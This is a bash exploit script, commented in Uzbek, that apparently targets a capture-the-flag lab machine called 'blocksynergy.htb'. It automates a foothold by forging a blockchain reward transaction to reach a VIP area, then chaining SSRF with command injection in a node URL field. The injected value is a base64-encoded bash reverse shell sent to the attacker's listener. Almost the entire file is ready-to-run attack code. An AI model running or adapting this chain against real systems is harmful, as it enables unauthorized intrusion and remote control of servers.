#!/usr/bin/env bash
# ============================================================
# BlockSynergy — FOOTHOLD: wallet -> forge -> SSRF -> cmd injection
#                             -> reverse shell as walter
#
# Pwnbox/Kali da ishga tushiring:
#   LHOST=<tun0 IP> LPORT=4444 ./03_foothold.sh
# ============================================================
set -euo pipefail

BASE="${BASE:-http://blocksynergy.htb:8080}"
LHOST="${LHOST:?LHOST kerak — tun0 IP ni bering}"
LPORT="${LPORT:-4444}"
WORK="${WORK:-./loot}"
mkdir -p "$WORK"
JAR="$WORK/cookies.txt"
rm -f "$JAR"

say() { printf '\n\033[1;36m[*] %s\033[0m\n' "$*"; }

# ---------- 1. Wallet ----------
say "1. Wallet yaratish"
curl -sS -L -c "$JAR" -b "$JAR" -X POST \
     -F 'action=create' -F 'filename=pwn' \
     "$BASE/dashboard/wallet" -o "$WORK/wallet.json"
PUB=$(jq -r '.public_key' "$WORK/wallet.json")
echo "    PUB = ${PUB:0:40}..."

# ---------- 2. Wallet'ni sessionga yuklash ----------
say "2. Wallet'ni sessionga yuklash"
curl -sS -L -c "$JAR" -b "$JAR" -X POST \
     -F 'action=load' \
     -F "file=@$WORK/wallet.json;filename=pwn.json;type=application/json" \
     "$BASE/dashboard/wallet" -o /dev/null -w '    HTTP %{http_code}\n'

# ---------- 3. Coin forging (Blockchain_Reward) ----------
say "3. Coin forging -> VIP"
jq -n --arg r "$PUB" \
   '{sender:"Blockchain_Reward",receiver:$r,signature:"Blockchain",
     amount:100,timestamp:"2026-08-29 20:00:00.000000"}' > "$WORK/reward.json"
curl -sS -c "$JAR" -b "$JAR" -H 'Content-Type: application/json' \
     --data @"$WORK/reward.json" "$BASE/broadcast_transaction"
echo

# ---------- 4. Eski node'larni tozalash ----------
say "4. Eski node'larni tozalash"
for i in $(seq 0 14); do
    curl -sS -c "$JAR" -b "$JAR" --data "action=remove_node&node_index=$i" \
         "$BASE/dashboard/vip/nodes" -o /dev/null || true
done
echo "    tozalandi"

# ---------- 5. Payload ----------
say "5. Command injection payload tayyorlash"
CMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
B64=$(printf '%s' "$CMD" | base64 -w0)
MAL="http://x;echo $B64|base64 -d|bash;a@0.0.0.0:8080/"
SSRF="http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=$(
    python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$MAL"
)"
echo "    MAL  = ${MAL:0:60}..."

# ---------- 6. Node'larni ro'yxatga olish ----------
say "6. Node'larni ro'yxatga olish"
curl -sS -c "$JAR" -b "$JAR" --data-urlencode 'action=register' \
     --data-urlencode "node=$MAL"  "$BASE/dashboard/vip/nodes" -o /dev/null -w '    MAL  HTTP %{http_code}\n'
curl -sS -c "$JAR" -b "$JAR" --data-urlencode 'action=register' \
     --data-urlencode "node=$SSRF" "$BASE/dashboard/vip/nodes" -o /dev/null -w '    SSRF HTTP %{http_code}\n'

# ---------- 7. Trigger ----------
say "7. Trigger (LISTENER: nc -lvnp $LPORT)"
for id in 1 2; do
    curl -sS -b "$JAR" --max-time 10 "$BASE/dashboard/vip/nodes/test_node/$id" \
         -o "$WORK/test_node_$id.html" || true
    echo "    test_node/$id -> $WORK/test_node_$id.html"
done

say "Tayyor. Listener'da shell paydo bo'lishi kerak."
echo "Keyingi qadam (walter shell ichida): RUN.md -> PWNBOX bo'limi, QADAM 2"
